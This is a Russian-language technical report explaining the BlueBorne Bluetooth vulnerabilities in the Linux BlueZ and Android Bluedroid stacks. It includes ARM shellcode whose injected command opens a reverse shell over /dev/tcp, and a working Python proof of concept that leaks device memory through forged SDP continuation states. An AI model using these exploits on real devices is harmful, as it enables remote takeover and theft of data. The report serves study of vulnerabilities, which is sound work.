# Введение
-----------------------------------

**Blueborne** - набор уязвимостей в Bluetooth стеках различных операционных систем.

Несмотря на множество атак, использующих интернет соединение, Blueborne может распространяться по воздуху через Bluetooth соединения. Такие атаки еще очень мало изучены, поэтому потенциально могут затрагивать множество уязвимых устройств. Также важно, что данная атака никак себя не обнаруживает на атакованных устройствах и обходит средства безопасности операционных систем, так как они не были специально спроектированы для обнаружения Blueborne. Высокие системные привилегии компонентов ОС, взаимодействующих с Bluetooth гарантируют вредоносному коду наивысшие права в системе.  

Blueborne включает в себя несколько типов уязвимостей: 

**Remote control execution (RCE)** - уязвимость, при которой происходит удаленное выполнение кода на взламываемом устройстве. Обнаружена в Bluetooth стеках Android и Linux.

**Уязвимости утечки данных** - позволяют атакующей стороне получить критически важные данные с устройства жертвы. Часто используются вместе с первым типом уязвимостей.

**Man in the middle (MITM)** - злоумышленник получает возможность тайно изменить связь между двумя сообщающимися сторонами и перехватывать данные от обеих сторон.

Для успешной атаки достаточно только включенного Bluetooth на устройстве жертвы. Никаких дополнительных действий больше не требуется. Затем злоумышленник сканирует **BD_ADDR** (**MAC** адрес) девайса жертвы. Далее есть возможность выбрать, получить контроль над устройством жертвы или просто прослушивать его данные, в том числе интернет трафик. Также можно включить атакуемое устройство в **ботнет** (компьютерная сеть из устройств, зараженных вредоносной программой). Эксплойт может самостоятельно распространяться на других устройствах.

# 1.1 Краткое введение в Bluetooth
-------------------------------
Многие сетевые протоколы предоставляют каналы связи для коммуникации и оставляют их использование на усмотрение пользователей. В противоположность этому Bluetooth предоставляет специальные приложения - **профили (profiles)**. И для каждого из них предоставляет свой набор протоколов. Это очень усложняет архитектуру Bluetooth ввиду того, что всего профилей более 30.

Как показано на рисунке 1.1.1, вся структура Bluetooth протоколов является некой альтернативой стека TCP/IP, начиная с физического уровня и заканчивая прикладным, следуя при этом модели OSI.

![](https://raw.githubusercontent.com/IgorKurylev/bluetooth-report/master/pics/1_1_1.jpg)
**Рисунок 1.1.1** архитектура стека Bluetooth протоколов

Чем ниже протокол - тем ближе он расположен к физическому уровню. Самые нижние уровни реализованы на контроллерах Bluetooth. Эти чипы взаимодействуют с ОС через интерфейс контроллера (**HCI**). Все протоколы выше **HCI** (например *L2CAP*, *SMP*, *SDP*) реализованы на уровне ОС и входят в отдельный стек Bluetooth конкретной ОС (иногда туда может входить и **HCI**). Профили на рисунке 1.1.1 представлены белым цветом и могут использовать часть стека протоколов для своих целей. Так как каждая ОС использует только собственный стек протоколов Bluetooth, то любая уязвимость, найденная в этом стеке затрагивает все устройства с этой ОС. Например, Linux и ранние версии Android используют стек *BlueZ*. Начиная с версии 4.2 Android использует свой собственный стек *Bluedroid*.

**BlueBorne** представляет собой несколько уязвимостей разных ОС на отдельных уровнях иерархии Bluetooth. В своем докладе я затрагиваю уязвимости Android и Linux (так как *BlueZ* ранее использовался в Android). На рисунке 1.1.2 показаны уровни, на которых обнаружены данные уязвимости.

![](https://raw.githubusercontent.com/IgorKurylev/bluetooth-report/master/pics/1_1_2.jpg)

**Рисунок 1.1.2** уровни стека Bluetooth, в которых найдены уязвимости

Кратко о каждом затронутом уровне:
- **L2CAP** - протокол транспортного уровня. Обеспечивает согласование **MTU** (максимальный размер полезного блока данных одного пакета), порядка следования пакетов и, при необходимости, надежность доставки.
- **SDP** - протокол обнаружения сервисов и приложений, которые поддерживаются Bluetooth устройством.
- **BNEP** - протокол инкапсуляции (обычно IP пакетов) поверх Bluetooth. Может, например, использоваться при раздаче интернета через Bluetooth.
- **PAN** - профиль, который использует **BNEP** для создания IP сетей поверх Bluetooth.

Более подробно о каждом уровне в разделах, описывающих уязвимости. 

# 1.2 Обзор Bluetooth стека в Android
--------------------------------
Пользовательское приложение использует Bluetooth процесс через *Binder* (специальную службу в Android, обеспечивающую межпроцессное взаимодействие). Java Native Interface (**JNI** - вызов кода на C/C++ из Java) используется Bluetooth процессом для взаимодействия с низкоуревневым Bluetooth стеком. Рисунок 1 объясняет реализацию Bluetooth в Android.

![](https://raw.githubusercontent.com/IgorKurylev/bluetooth-report/master/pics/1_2_1.png)

***Рисунок 1.2.1*** архитектура Bluetooth стека в Android
     
- **Application framework** - пользовательское приложение, использующее библиотеку *android.bluetooth* и механизм *Binder*
- **Bluetooth system service** - служба Bluetooth, расположенная в *packages/apps/Bluetooth* как отдельное приложение. Взаимодействует с уровнем **HAL** через **JNI**
- **JNI** - код на С/C++, расположенный в *packages/apps/Bluetooth/jni* (как раз представляет собой библиотеку *android.bluetooth*). Когда выполняется какая-либо Bluetooth операция, например обнаруживается новое Bluetooth устройство,  ожидает выполнения специальных функций-коллбэков из уровня **HAL**
- **Hardware abstraction level (HAL)** - более близкий к аппаратной части уровень. Предназначен для связи ядра Android c аппаратной частью Bluetooth стека. Реализовывает специальный интерфейс, который используется *android.bluetooth*.
- **Bluetooth stack** - реализация стека протоколов Bluetooth, расположен в *system/bt*. Расширяет уровень **HAL** дополнительными модулями и конфигурациями.
- **Vendor extensions** - может быть добавлен вендором (компанией, которая выпускает конкретный девайс) для реализации командного интерфейса контроллера (драйвера **HCI**).

# 2.1 L2CAP и уязвимость BlueZ стека Linux
----------------------------------------
### Обзор L2CAP

На стороне ОС это самый нижний уровень иерархии Bluetooth. L2CAP отвечает за связь между различными сервисами (протоколами) Bluetooth стека. Инкапсулирован в транспортный протокол **ACL** (предоставляет **chanel IDs**, далее **CIDs**, аналоги портов в UDP или TCP, куда передаются пакеты, но не предоставляет надежности доставки). Спецификация Bluetooth может резервировать некоторые **CIDs** для своих целей. Другие **CIDs** присваиваются динамически. Например, если некоторая конечная точка хочет послать сообщение какому-то Bluetooth сервису, ей будет динамически выделен свой **CID**.

Во время создания нового L2CAP соединения, две конечные точки пытаются достичь согласования (по пропускной способности и иным параметрам), обмениваясь специальными пакетами, **запросом** и **ответом** конфигурации. Запрос конфигурации содержит  параметры, по которым можно сказать о типе используемого соединения.

### Процесс обмена конфигурациями

В документации Bluetooth запросы и ответы конфигурации обозначены как **L2CAP_ConfReq** и **L2CAP_ConfResp** сообщения. Начальный обмен этими сообщениями между конечными точками называется **инициализирующим рукопожатием**. *L2CAP_ConfResp* содержит статус-код, который информирует отправителя о том, приняты ли его параметры конфигурации, или в этом отказано. 
![](https://raw.githubusercontent.com/IgorKurylev/bluetooth-report/master/pics/2_1_1.jpg)
**Рисунок 2.1.1** типичный процесс обмена конфигурацией. В данном примере две конечные точки обмениваются информацией об **MTU** (максимальный размер полезного блока данных одного пакета). Остальные параметры выставлены по умолчанию.

Рисунок 2.1.1 иллюстрирует процесс обмена конфигурациями. Девайс **А** запрашивает **MTU** как параметр (*option = 0x01*) и его величину *0x100*, которую девайс **B** принимает и затем запрашивает величину **MTU** как *0x200*, которую девайс **A** также принимает. Таким образом, максимальная величина сообщения, которое устройство **А** может послать устройству **B** составляет *0x100* и обратно от **B** к **A** *0x200*. 

В отличие от вышеприведенного примера, устройство может отклонить параметры, которые ему не подходят. Чтобы облегчить дальнейший обмен конфигурациями, его ответ может содержать альтернативные, приемлимые для себя параметры. Следующая выдержка кода из ядра Linux отражает этот момент. Изначально **MTU** инициализировано по умолчанию.
```c++
// если запрошенный MTU меньше 
// чем минимальный по умолчанию
if (mtu < L2CAP_DEFAULT_MIN_MTU)
    // отбрасываем
	result = L2CAP_CONF_UNACCEPT;
else {
    // присваиваем MTU каналу
	chan->omtu = mtu;
	// заканчиваем настройку MTU
	set_bit(CONF_MTU_DONE, &chan->conf_state);
}
// добавляем настройки конфигурации
l2cap_add_conf_opt(&ptr, L2CAP_CONF_MTU, 2, chan->omtu, endptr - ptr);
```
Фрагмент исходного кода функции **l2cap_parse_conf_req** (*net/bluetooth/l2cap_core.c*)

Таким образом, если предложенное значение **MTU** нам не подходит, в настройки конфигурации войдет значение по умолчанию (мы предложим свое значение). Таким образом процесс обмена конфигурациями продолжится, пока стороны не придут к взаимовыгодным параметрам соединения.

Существует иной механизм процесса обмена конфигурациями для более отказоустойчивого соединения под названием **Extended Flow Specification (EFS)**. Все **EFS** параметры должны быть перепроверены каждой конечной точкой соединения. Поэтому ответ от устройства на конфигурационный запрос может быть **"в ожидании" (pending)**, так как оно не до конца проверило все **EFS** параметры, что будет использовано в уязвимости. После того, как устройства обменялись всеми **EFS** параметрами, стороны достигнут взаимного соглашения.

### RCE уязвимость ядра Linux (CVE-2017-1000251) 

Данная уязвимость затрагивает BlueZ стек ядра Linux, а конкретно реализацию механизма **EFS** протокола L2CAP в функции *l2cap_parse_conf_rsp*. 
Первая ее часть приведена в следующей выдержке.
```c++
static int l2cap_parse_conf_rsp(struct l2cap_chan *chan, void *rsp, int len,
void *data, u16 *result)
{
    // rsp - указатель на буфер в котором 
    // находится конфигурационный ответ
    // len - его длина
    // data - указатель на буфер
    // в который помещаются параметры после проверки
    struct l2cap_conf_req *req = data;
    void *ptr = req->data;
    // ...
    while (len >= L2CAP_CONF_OPT_SIZE) {
        // получаем в цикле элементы из буфера rsp
        len -= l2cap_get_conf_opt(&rsp, &type, &olen, &val);
        switch (type) {
            case L2CAP_CONF_MTU:
                // проверяем MTU
                l2cap_add_conf_opt(&ptr, L2CAP_CONF_MTU, 2, chan->imtu);
                break;
            case L2CAP_CONF_FLUSH_TO:
                chan->flush_to = val;
                l2cap_add_conf_opt(&ptr, L2CAP_CONF_FLUSH_TO, 2, chan->flush_to);
                break;
            // и другие параметры
        }
    }
    // ...
    return ptr - data;
}
```
Фрагмент исходного кода функции **l2cap_parse_conf_rsp** (*net/bluetooth/l2cap_core.c*)

Функция получает конфигурационный ответ в буфере на который указывает *rsp* и в цикле получает по одному каждый конфигурационный параметр, используя **l2cap_get_conf_opt**. Каждый полученный элемент проверяется и записывается обратно через указатель *ptr* (поле **data** в структуре *l2cap_conf_req*) в буфер ответа, на который указывает *data*. Здесь важно заметить, что длина буфера *data* в функцию не передается.

Размер приходящего ответа никак не ограничен, что позволяет атакующей стороне прислать ответ *rsp* в котором могут быть дупликаты. Как результат, все содержимое *rsp* (включая возможные дупликаты) скопируются в буфер *data*. Функция в которой формируется *data* (**l2cap_parse_conf_rsp**) вызывается из двух мест в **l2cap_config_rsp**, которая обрабатывает сообщения ответов конфигурации. Эти два места похожи, поэтому оба могут использоваться при эксплуатации уязвимости. Первый фрагмент такого участка представлен на следующей выдержке исходного кода.

```c++
switch (result) {
    case L2CAP_CONF_SUCCESS:
        ...
        break;
    case L2CAP_CONF_PENDING:
        // если устройство в состоянии "ожидание"
        set_bit(CONF_REM_CONF_PEND, &chan->conf_state);
        if (test_bit(CONF_LOC_CONF_PEND, &chan->conf_state)) {
            char buf[64];
            // buf передается как буфер data
            // rsp->data в качестве rsp
            len = l2cap_parse_conf_rsp(chan, rsp->data, len, buf, &result);
        ...
        goto done;
```
Выдержка из исходного кода функции **l2cap_config_rsp** (*net/bluetooth/l2cap_core.c*)

*switch* проверяет значение, которое было было получено из ответа конфигурации, что может управляться атакующим. Далее роль *data* будет играть *char buf[64]*. Данный участок кода исполнится только если устройство будет в состоянии "в ожидании", что может быть спровоцировано следующим фрагментом кода.
```c++
if (remote_efs) {
    if (chan->local_stype != L2CAP_SERV_NOTRAFIC &&
        // поле которое используется в дальнейшем
        efs.stype != L2CAP_SERV_NOTRAFIC &&
        efs.stype != chan->local_stype) {
        ...// эта ветвь не используется
    } else {
        // посылаем конфигурационный ответ "в ожидании"
        result = L2CAP_CONF_PENDING;
        set_bit(CONF_LOC_CONF_PEND, &chan->conf_state);
    }
}
```
Выдержка из исходного кода функции **l2cap_config_rsp** (*net/bluetooth/l2cap_core.c*)

Отсюда следует, что для перехода устройства в состояние "в ожидании" достаточно послать конфигурационный запрос с **EFS** опцией, выставив поле **stype** в *L2CAP_SERV_NOTRAFIC*.

После того, как мы достигли состояния жертвы "в ожидании", буфер ***buf[64]*** может быть произвольно перезаписан и передан в функцию **l2cap_parse_conf_rsp**. Эта уязвимость позволяет атакующему совершить переполнение буфера *buf* неограниченным количеством данных.

### Как работает переполнение буфера

Пусть у нас есть следующий фрагмент кода.
```c++
#include <string.h>

int main(int argc, char *argv[]) {
	char buf[100];
	strcpy(buf, argv[1]);
	return 0;
}
```
При передаче в *argv[1]* строки, превышающего по длине размер массива *buf*, произойдет переполнение буфера, как показано на рисунках 2.1.2 и 2.1.3, так как функция **strcpy** не проверяет размер переданной ей строки. 
![](https://raw.githubusercontent.com/IgorKurylev/bluetooth-report/master/pics/2_1_2.png)

**Рисунок 2.1.2** до копирования

![](https://raw.githubusercontent.com/IgorKurylev/bluetooth-report/master/pics/2_1_3.png)

**Рисунок 2.1.3** после копирования

Так как в архитектуре x86 стек растёт от больших адресов к меньшим, то, записывая данные в буфер, можно осуществить запись за его границами и изменить находящиеся там данные, в частности, изменить адрес возврата.
Таким образом, атакующая сторона может:
- перезаписать локальную переменную, находящуюся в памяти рядом с буфером, изменяя поведение программы в свою пользу
- перезаписать адрес возврата в стековом кадре. Как только функция завершается, управление передаётся по указанному атакующим адресу, обычно в область памяти, к изменению которой он имел доступ
- перезаписать указатель на функцию или обработчик исключений, которые впоследствии получат управление

### Эксплуатация уязвимости CVE-2017-1000251

В данном разделе я привожу объяснение возможного использования CVE-2017-1000251. Целью атаки будет попытка развернуть shell-оболочку на устройстве жертвы, которую будет контролировать атакующий. Исследователи выбрали аудио-колонку Amazon Echo с версией ядра Linux 2.6.37 (ARM 32-бита). Очень старая версия, но зато в ней практически нет никаких механизмов защиты, их обход усложнил бы пример.

Для проведения атаки будут выполнены следующие шаги:
- Найти способ рассылки произвольных конфигурационных ответов
- Перезаписать важные адреса в стеке (адреса функций). В качестве буфера выступает конфигурационный ответ. 
- Найти способ обойти возможные ограничения (в сборке ядра Amazon Echo и вообще во многих *IOT*-устройствах изначально нет **KASLR**-рандомизации адесного пространства ядра, **stack-canaries**-отметки на стеке, которые могут сообщать о переполнениях буфера и **NX-bit**-предотвращает область данных от исполнения и исполнительную часть от перезаписывания) 
- через механизм **usermode-helpers** (его суть будет описана далее) развернуть shell-оболочку на атакуемом устройстве и подключиться к ней через TCP соединение с атакующего устройства

К сожалению до версии 3.3 ядра Linux уязвимость CVE-2017-1000251 существует в несколько ограниченном виде. Далее приведен исходный код **l2cap_config_rsp**: 

```c++
switch (result) {
    ...
    // в отличие от оригинальной версии уязвимости
    // здесь другое состояние
    case L2CAP_CONF_UNACCEPT:
    ...
    char req[64];
    // если длина конфигурационного ответа больше 60 байтов
    if (len > sizeof(req) - sizeof(struct l2cap_conf_req))
        // разрыв соединения 
        l2cap_send_disconn_req(conn, sk, ECONNRESET);  goto done;
    }

    result = L2CAP_CONF_SUCCESS;
    len = l2cap_parse_conf_rsp(chan, rsp->data, len, req, &result);
...
```
Данная ветка *switch* отвечает за другое состояние, но это несильно важно, так как атакующая сторона все равно может его достичь. Ограничение состоит в том, что теперь конфигурационный ответ должен быть размером не больше 60 байт, но тот буфер, который должны переполнить размера 64 байт, изначально больше максимального размера конфигурационного ответа. Но как оказалось, нет. Далее вызывается функция **l2cap_parse_conf_rsp** (функция, в которой обнаружен изначальный сценарий для уязвимости): 

```c++
...
while (len >= L2CAP_CONF_OPT_SIZE) {
    // цикл по всем входным элементам
    // type == 0x04 (conf RFC)
    // olen == 0x00
    len -= l2cap_get_conf_opt(&rsp, &type, &olen, &val);
    switch (type) {
        ...
        case L2CAP_CONF_RFC:
            if (olen == sizeof(rfc))
                memcpy(&rfc, (void *)val, olen);
            // здесь в качестве sizeof(rfc) подается ненулевое значение, хотя olen == 0x00 
            l2cap_add_conf_opt(&ptr, L2CAP_CONF_RFC, sizeof(rfc), (unsigned long)&rfc);
            
            break;
```
Здесь в ветке *switch* в выходной буфер передается ненулевой размер (*sizeof(rfc)*), несмотря на реальное значение длины (передаем 0), поэтому за счет этого мы можем увеличить размер пакета (*sizeof(rfc)* равен 11 байтам). На рисунке 2.1.4 приведен стек с переданным пакетом типа *L2CAP_CONF_RFC*. Два красных байта - установленные заранее тип и длина. Зеленым отмечены неподконтрольные данные. Например, передавая 30 таких двухбайтных пакетов, мы уложимся в ограничение на 60 переданных байтов, но по факту в стек будет записано 30*11=330 байтов, что намного больше, чем 64 байта в оригинальном сценарии. Здесь байты, отмеченные зеленым цветом непроинициализированы, так как мы не имеем к ним доступа. 

![](https://raw.githubusercontent.com/IgorKurylev/bluetooth-report/master/pics/2_1_4.png)

**Рисунок 2.1.4** записанные данные на стек

На рисунке 2.1.5 изображены стековые кадры функций, работающих с переданными ранее выходными буферами. *ptr* указывает на следующий элемент в выходном буфере. Видно, что если выполняется переполнение, мы контролируем, куда запишется следующий элемент.

![](https://raw.githubusercontent.com/IgorKurylev/bluetooth-report/master/pics/2_1_5.png)

**Рисунок 2.1.5** стековые кадры функций **lcap_recv_frame** и **l2cap_recv_acldata**

Так как *ptr* показывает, куда запишется следующий элемент, то, если изменить его, можно перезаписать любое место на стеке. На рисунке 2.1.6 показано его размещение. Из-за расположения *ptr* обойтись только пакетами типа *L2CAP_CONF_RFC* не удалось (*ptr* не удалось бы перезаписать в следующий раз), для выравнивания были записаны 3 дополнительных элемента типа **FLUSH**. 

![](https://raw.githubusercontent.com/IgorKurylev/bluetooth-report/master/pics/2_1_6.png)

**Рисунок 2.1.6** где будет располагаться *ptr* на стеке

На рисунке 2.1.7 показано, как перезапишется *ptr*, также видно, что в следующий раз *ptr* будет по адресу *0xBEFC*, так как в **ARM** используется порядок байтов от младшего к старшему (little-endian). Таким образом перезапишется регистр **LR** (в **ARM**-адрес возврата) и управление перехватится шелл-кодом атакующей стороны.

![](https://raw.githubusercontent.com/IgorKurylev/bluetooth-report/master/pics/2_1_7.png)

**Рисунок 2.1.7** перезаписанный *ptr* на стеке

 К сожалению нам подконтрольны только два байта адреса возврата (выделены красным). Но в **L2CAP** возможно передавать несколько команд-элементов в одном пакете. Поэтому вся последовательность из 22 пустых элементов *RFC* плюс 3 элемента *FLUSH* запишется два раза, подменяя каждый раз каждую из частей адреса возврата, (поэтому *FLUSH* элементов 3 штуки). То есть первый раз перезапишутся байты, выделенные красным на рисунке 2.1.7, затем-желтые.   

Также на стек (не принципиально по какому адресу, так как мы контролируем адрес возврата) загружается шелл-код, приведенный ниже:
```python
# регистр pc - счетчик команд
# все ldr команды в данном случае загружают по 
# указанному смещению от pc 4-х байтные слова в нужные регистры

CODE = """
cc020010 <A>:
cc020010:       e59f0020        ldr     r0, [pc, #32]   ; cc020038 <POWEROFF_CMD> - параметр memcpy, куда идет запись
cc020014:       e28f102c        add     r1, pc, #44     ; 0x2c - параметр memcpy, откуда происходит чтение (адрес команды  вызова shell-оболочки)
cc020018:       e3a02c01        mov     r2, #256        ; 0x100 - длина записываемых данных
cc02001c:       e59f3018        ldr     r3, [pc, #24]   ; cc02003c <MEMCPY_ADDR>
cc020020:       e12fff33        blx     r3 ; вызов memcpy
cc020024:       e3a00000        mov     r0, #0
cc020028:       e59f3010        ldr     r3, [pc, #16]   ; cc020040 <ORDERLY_POWEROFF_ADDR>
cc02002c:       e12fff33        blx     r3 ; вызов orderly_poweroff
cc020030:       e59f300c        ldr     r3, [pc, #12]   ; cc020044 <L2CAP_RECV_ACLDATA_RET_ADDR>
cc020034:       e12fff13        bx      r3 ; переход на функцию, продолжающую работу процесса Bluetooth
"""
SHELLCODE = "2000 9fe5 2c10 8fe2 012c a0e3 1830 9fe5" \
            "33ff 2fe1 0000 a0e3 1030 9fe5 33ff 2fe1" \
            "0c30 9fe5 13ff 2fe1"
```
Мы находимся в пространстве ядра (так как реализация **L2CAP** включена в ядро Linux). Нам требуется запустить shell-оболочку от имени root в пространстве пользователя, что сделать мы  из пространства ядра пока не можем. Для обхода этого ограничения используется механизм ядра Linux под названием **usermode-helpers**. Суть его в следующем: для того, чтобы корректно выключить устройство, в адресном пространстве пользователя используется функция **orderly_poweroff**, она в свою очередь использует **POWEROFF_CMD** - строка команды пространства ядра, непосредственно отвечающей за выключение. Поэтому мы перезаписываем **POWEROFF_CMD** на свою команду запуска shell-оболочки "/bin/bash -c /bin/bash < /dev/tcp/192.168.0.4/1234" (запуск shell-оболочки и выполнение команд, полученных с ip 192.168.0.4 и порта 1234, используя TCP соединение). И затем вызываем **orderly_poweroff**, выполняем нужные команды и, с помощью перехода по адресу функции **l2cap_recv_acldata**, продолжаем работу демона bluetoothd (процесса Bluetooth)

### Выводы

На сегодняшний день в современных операционных системах существует множество способов предотвращения атак переполнения стека. Но для многих *IOT* устройств используются небезопасные сборки ОС, позволяющие получить удаленный контроль над девайсом. 

В случае с BlueZ, реализация уровня **L2CAP** включена в ядро Linux. Это решение не самое удачное, потому что из-за таких потенциально уязвимых механизмов как **EFS**, внедренный вредоносный код будет иметь наибольшие привилегии. Это дает надежный эксплойт для атакующей стороны, требуется только включенный Bluetooth и информация о MAC-адресе жертвы, что можно легко прослушать с помощью специальных устройств для перехвата Bluetooth трафика. Ничто также не мешает также распространять вредоносный код с зараженных девайсов и создать целый ботнет, использующий уязвимости Bluetooth.

# 2.2 SDP и уязвимости Bluetooth стеков  Linux и Android (CVE-2017-1000250 и CVE-2017-0785) 
--------------------------------------
### Обзор SDP

Назначение протокола **SDP** (**service discovery protocol**) заключается в том, чтобы позволять устройствам Bluetooth понимать, какие сервисы и приложения (или устройства вокруг) поддерживают Bluetooth. Использует клиент-серверную модель.

Для того, чтобы получить информацию об определенном сервисе, *SDP клиент* посылает **SDP-запрос** *SDP-серверу* и ожидает **SDP-ответ**. Для этого процесса **SDP** определяет особый механизм фрагментации (**SDP-continuation**). Он состоит в следующем:
- *SDP клиент* посылает *SDP-запрос*
- Если ответ на этот запрос превышает значение **MTU** (максимальный размер полезного блока данных одного пакета) для установленного **L2CAP** соединения, вернется только часть ответа, а перед *SDP-ответом* будет выставлено поле **continuation-state**
- Чтобы получить остальные фрагменты ответа, *SDP-клиент* пошлет тот-же самый *SDP-запрос* еще раз,  но в этот запрос также выставит поле **continuation-state**
- *SDP-сервер* пришлет следующий фрагмент ответа
- предыдущие шаги будут повторяться, пока клиент не получит ответ целиком

Важно заметить, что спецификация Bluetooth оставляет реализацию **continuation-state** за каждым *SDP-сервером*. И возвращенное поле **continuation-state** никак не используется *SDP-клиентом* напрямую (клиент должен посылать это поле неизмененным). Это лежит в основе двух уязвимостей утечки информации в Bluetooth стеках Linux и Android.

### Уязвимость утечки информации в BlueZ стеке Linux (CVE-2017-1000250)
Данная уязвимость возникает из-за ошибки в реализации механизма фрагментации протокола **SDP**. BlueZ определяет **continuation-state** как:
```c++
typedef struct {
    // может также послужить утечкой
    // о времени на конкретном устройстве
    uint32_t timestamp; 
    union {
        uint16_t maxBytesSent;
        // индекс показывает сколько
        // байтов прислали
        uint16_t lastIndexSent;
    } cStateValue;
} sdp_cont_state_t;
```
Структура **continuation-state** из исходного кода BlueZ (src/sdpd-request.c)

Так как *SDP клиент* постоянно должен вставлять эту структуру перед тем, как хочет получить очередной фрагмент ответа, он может подменить поле **lastIndexSent**, что может повлечь за собой чтение данных, находящихся за пределами буфера, в котором хранится *SDP-ответ*, что следует из обработчика запроса, приведенного далее:
```c++
...
    } else {
        //cstate - continuation-state 
        sdp_buf_t *pCache = sdp_get_cached_rsp(cstate);
        if (pCache) { 
            // получено continuation-state
            // из ответа в кэше
            uint16_t sent = MIN(max, pCache->data_size -
cstate->cStateValue.maxBytesSent);
            pResponse = pCache->data;
            //копируются данные, находящиеся в ответе
            memcpy(buf->data, pResponse + cstate->cStateValue.maxBytesSent, sent);
            buf->data_size += sent;
            cstate->cStateValue.maxBytesSent += sent;
            //если отправили все фрагменты пакета
            if (cstate->cStateValue.maxBytesSent == pCache->data_size)
                //размер выставляется в нуль
                cstate_size = sdp_set_cstate_pdu(buf, NULL);
            else
                //размер выставляется такой же как и у cstate
                cstate_size = sdp_set_cstate_pdu(buf, cstate);
        } else {
            status = SDP_INVALID_CSTATE;
            SDPDBG("Non-null continuation state, but null cache buffer");
        }
    }
...
```
Выдержка из функции service_search_attr_req исходного кода *SDP-сервера* BlueZ (src/sdpd-request.c)

На данном участке кода *SDP сервер* некорректно проверяет поле **maxBytesSent** из структуры **continuation-state** (переменная *cstate*), что позволяет вышестоящему вызову функции **memcpy** скопировать данные, находящиеся за пределами буфера *pResponse*. Атакующей стороне остается лишь обойти этот некорректный **if(...)**, который проверяет, что все данные были отправлены. Этого легко достичь, так как клиент имеет доступ к полю **maxBytesSent** структуры **continuation-state**.

BlueZ стек разбит на две части, одна из которых работает на *уровне ядра* (отрывок был рассмотрен в уязвимости **L2CAP**), вторая - на *пользовательском уровне*. Процесс *bluetoothd* как раз содержит последнюю часть и контролирует критически важные данные (например ключи шифрования Bluetooth-соединений), которые могут быть получены при эксплуатации данной уязвимости. Данная утечка очень напоминает **Heartbleed (CVE-2014-0160)** - ошибку в криптографическом программном обеспечении *OpenSSL*, позволяющую несанкционированно читать память на сервере или на клиенте, в том числе для извлечения закрытого ключа сервера.

### Эксплуатация уязвимости CVE-2017-1000250
Данный пример на языке python для простоты показывает только, как можно получить данные за пределами выделенного буфера, никак при этом их не используя.

Определим сначала нужные структуры данных (в классе scapy.packet.Packet уже определены специальные методы и поля для удобного конструирования пакетов):
```python
# собственная реализация Bluez continuation state 
# (приведена в разделе выше)
class BlueZ_ContinuationState(Packet):
    fields_desc = [
        LEIntField("timestamp", 0),
        LEShortField("maxBytesSent", 0),
        LEShortField("lastIndexSent", 0),
    ]

# собственная реализация SDP-запроса поиска поддерживаемых сервисов
# содержит id необходимого нам сервиса и список параметров,
# которые требуется от него получить
class SDP_ServiceSearchAttributeRequest(Packet):
    fields_desc = [
        # id SDP протокола
        ByteField("pdu_id",0x06),
        # id транзакции
        ShortField("transaction_id", 0x00),
        # длина параметров
        ShortField("param_len", 0),
        # id сервиса/сервисов
        FieldListField("search_pattern", 0x00, ByteField("", None)),
        # максимальное количество байтов, которое хотим получить в ответе
        ShortField("max_attr_byte_count", 0),
        # список параметров
        FieldListField("attr_id_list", 0x00, ByteField("", None)),
        # длина continuation state 
        ByteField("cont_state_len", 0),
    ]
```
Установим **L2CAP** соединение и согласуем значение **MTU**. Так как относительно **SDP** это низлежащий протокол, воспользуемся готовой реализацией  **L2CAP** из python-библиотеки *bluetooth*:
```python
# получим BD_ADDR (MAC-aдрес устройства жертвы) из аргументов
# выберем значение MTU как 512 байтов 
target = sys.argv[1]
mtu = 512

# создадим L2CAP-сокет и установим соединение
print("Connecting L2CAP socket...")
sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
bluetooth.set_l2cap_mtu(sock, mtu)
sock.connect((target, 1))
```
Отправим первый *SDP-пакет* для получения метки времени на устройстве-жертвы:
```python
# search-pattern и attr_id_list такие для примера
# изменяя эти значения, можно получать данные от различных Bluetooth-сервисов
req1 = SDP_ServiceSearchAttributeRequest(search_pattern = [0x35, 0x03, 0x19, 0x01, 0x00],
                            attr_id_list = [0x35, 0x05, 0x0a, 0x00, 0x00, 0x00, 0x01],
                            max_attr_byte_count = 10)
sock.send(bytes(req1))
resp1 = sock.recv(mtu)

# обработка полученного continuation-state
cont_state = resp1[-8:]
host_timestamp = int.from_bytes(cont_state[:4], byteorder = 'little')
print("Extracted timestamp:", hex(host_timestamp))
```
После этого отправляем *SDP-пакеты* с подмененным **continuation-state**:
```python
received_data = b''
offset = 65535

print("Dumping", offset, "bytes of memory...")
while offset > 0:
    print("Sending SDP req, offset:", offset)
    req2 = SDP_ServiceSearchAttributeRequest(search_pattern = [0x35, 0x03, 0x19, 0x01, 0x00],
                                attr_id_list = [0x35, 0x05, 0x0a, 0x00, 0x00, 0x00, 0x01],
                                max_attr_byte_count = 65535)
    # подмена continuation-state (используется подмена поля maxBytesSent)
    # за счет такой подмены двигаем границы передаваемого нам буфера
    forged_cont_state = BlueZ_ContinuationState(timestamp = host_timestamp, 
                                maxBytesSent = offset) 
    # записываем в пакет подмененное continuation-state
    req2 = req2 / forged_cont_state
    # отправляем пакет
    sock.send(bytes(req2))

    data = sock.recv(mtu)
    data = data[7:] # убираем SDP параметры
    data = data[:-9] # убираем continuation state
    # сохраняем полученные данные 
    received_data = data + received_data
    # двигаем смещение
    offset -= len(data) if len(data) > 0 else 1

print(hexdump(received_data))
```
Полученные байты хранятся в массиве *received_data*

### Уязвимость утечки информации в Bluedroid стеке Android (CVE-2017-0785)

Наподобие BlueZ, в Android структура **continuation-state** реализована следующим образом:
```c++
typedef struct {
    uint16_t cont_offset;
} sdp_cont_state_t;
```
Структура **SDP continuation-state** в Bluetooth стеке Android

В данном случае передается смещение, наподобие поля *lastIndexSent* в BlueZ, без отметки времени. 

Хотя обработчик *SDP-запроса* выполняет более сложные проверки поля **cont-offset**, его реализация все равно подвержена похожей уязвимости утечки информации. В приведенной далее выдержке кода в *num_rsp_handles* хранится общее количество получаемых *SDP-запросов*:
```c++
if (*p_req) {
    ...
    // проверка, что поле cont_offset осталось неизменным
    if (cont_offset != p_ccb->cont_offset) {
        sdpu_build_n_send_error(p_ccb, trans_num, SDP_INVALID_CONT_STATE, SDP_TEXT_BAD_CONT_INX);
        return;
    }
    // получаем оставшиеся обработки запросов
    // здесь может быть переполнение rem_handles
    rem_handles = num_rsp_handles - cont_offset;
} ...

// вычисляется, сколько таких обработок запросов
// поместится в одном фрагменте
cur_handles = 
(uint16_t)((p_ccb->rem_mtu_size - SDP_MAX_SERVICE_RSPHDR_LEN) / 4);
if (rem_handles <= cur_handles)
    cur_handles = rem_handles;
else // continuation установлено корректно
{
    p_ccb->cont_offset += cur_handles;
    is_cont = true;
}
...
for (xx = cont_offset; xx < cont_offset + cur_handles; xx++)
    UINT32_TO_BE_STREAM(p_rsp, rsp_handles[xx]);
```
Выдержка из функции process_service_search исходного кода *SDP-сервера* Android (stack/sdp/sdp_server.c)

